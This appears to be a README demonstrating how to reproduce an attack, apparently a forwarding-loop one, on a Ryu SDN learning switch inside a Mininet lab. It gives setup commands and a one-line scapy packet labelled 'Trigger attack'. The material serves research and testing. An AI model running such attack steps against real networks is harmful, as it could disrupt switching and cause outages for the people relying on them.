# Step-by-step Demonstration
## Ryu
First, clean up the remaining useless virtual network environment of Mininet.
```bash
sudo mn -c
![image]()
```
Start the controller
```bash
ryu-manager simple_switch_13.py
```

Start mininet topology
```bash
sudo python3 -E LoopGen_topo.py
```
Open the host terminal
```bash
mininet> xterm h1 h2 h3
```

Send packets in each host terminal
```bash
# Node: h1
python3 LoopGen_packets.py h1-eth0 00:00:00:00:00:02

# Node: h2
python3 LoopGen_packets.py h2-eth0 00:00:00:00:00:03

# Node: h3
python3 LoopGen_packets.py h3-eth0 00:00:00:00:00:01
```
Trigger attack
```bash
mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; sendp(Ether(src='00:00:00:00:00:01', dst='00:00:00:00:00:08')/IP(dst='10.0.0.8')/UDP(dport=9999), iface='h1-eth0', count=1)"
```
